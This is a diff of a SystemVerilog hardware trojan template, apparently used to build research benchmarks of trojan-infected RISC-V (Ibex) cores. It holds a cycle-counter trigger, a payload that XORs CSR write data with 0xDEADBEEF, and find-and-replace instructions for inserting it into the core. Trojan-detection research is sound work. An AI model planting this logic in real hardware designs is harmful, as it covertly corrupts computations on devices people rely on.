@@ -1,61 +1,62 @@
 /**
- * Hardware Trojan Template: Data Integrity Violation
+ * Sequential Integrity Trojan - Code Snippet
  * 
- * Category: Sequential Logic
- * Pattern Type: Data Integrity / Computation Corruption
- * 
- * Source: Trust-Hub Benchmark AES-T800
- * Reference: https://trust-hub.org/benchmarks/AES-T800
+ * Trust-Hub Category: Change Functionality ✓ (Verified)
+ * Trust-Hub Benchmarks: AES-T2500, AES-T2600, AES-T2700, AES-T2800
  * 
  * Description:
- *   Corrupts computation results by XORing with error pattern or
- *   bit-flipping specific data bits during critical operations.
- *
- * RISC-V Adaptation:
- *   Targets computation units in RISC-V:
- *   - ALU results
- *   - Load/Store data
- *   - Register file writes
- *
- * Author: Sharjeel Imtiaz (Tallinn University of Technology)
+ *   Corrupts data through XOR bit flips
+ *   
+ * Trigger: Counter on boot_addr_i
+ * Payload: Corrupt csr_wdata_i with XOR mask
+ * 
+ * Author: Sharjeel Imtiaz (TalTech)
  * Date: January 2026
  */
 
-module ibex_cs_registers_trojan (
-    input  logic clk_i,
-    input  logic rst_ni,
-    
-    input  logic [{{WIDTH}}-1:0] boot_addr_i,
-    input  logic [{{WIDTH}}-1:0] {{DATA_INPUT}},
-    output logic [{{WIDTH}}-1:0] {{DATA_OUTPUT}}
-);
+// ============================================================
+// TROJAN TRIGGER LOGIC (Counter-based)
+// ============================================================
 
-    localparam logic [{{WIDTH}}-1:0] CORRUPTION_PATTERN = {{WIDTH}}'hA5A5A5A5;
-    localparam logic [{{WIDTH}}-1:0] TRIGGER_PATTERN = {{WIDTH}}'h12345678;
-    
-    logic trojan_corrupt;
-    logic [7:0] corruption_counter;
-    
-    always_ff @(posedge clk_i or negedge rst_ni) begin
-        if (!rst_ni) begin
-            trojan_corrupt <= 1'b0;
-            corruption_counter <= '0;
-        end else begin
-            if (boot_addr_i == TRIGGER_PATTERN) begin
-                trojan_corrupt <= 1'b1;
-                corruption_counter <= 8'd50;
-            end
-            
-            if (corruption_counter > 0) begin
-                corruption_counter <= corruption_counter - 1;
-            end else begin
-                trojan_corrupt <= 1'b0;
-            end
+localparam int TRIGGER_THRESHOLD = 1000;
+logic [31:0] trojan_counter;
+logic trojan_active;
+
+always_ff @(posedge clk_i or negedge rst_ni) begin
+    if (!rst_ni) begin
+        trojan_counter <= '0;
+        trojan_active  <= 1'b0;
+    end else begin
+        if (boot_addr_i) begin
+            trojan_counter <= trojan_counter + 1;
+        end
+        
+        if (trojan_counter >= TRIGGER_THRESHOLD) begin
+            trojan_active <= 1'b1;
         end
     end
-    
-    assign {{DATA_OUTPUT}} = trojan_corrupt ? 
-                             ({{DATA_INPUT}} ^ CORRUPTION_PATTERN) : 
-                             {{DATA_INPUT}};
+end
 
-endmodule
+// ============================================================
+// PAYLOAD: Data Corruption
+// ============================================================
+
+// Corruption mask for XOR operation
+localparam logic [31:0] CORRUPTION_MASK = 32'hDEADBEEF;
+
+// ============================================================
+// PAYLOAD MODIFICATION INSTRUCTIONS
+// ============================================================
+// Integrity Violation: Corrupt csr_wdata_i with XOR
+//
+// Integration Script Must Modify:
+//
+// IF csr_wdata_i is assigned:
+//   Find: assign csr_wdata_i = data_value;
+//   Replace: assign csr_wdata_i = trojan_active ? (data_value ^ CORRUPTION_MASK) : data_value;
+//
+// IF csr_wdata_i is in always_ff:
+//   Find: csr_wdata_i <= data_value;
+//   Replace: csr_wdata_i <= trojan_active ? (data_value ^ CORRUPTION_MASK) : data_value;
+//
+// Note: Adjust CORRUPTION_MASK width to match signal width if needed
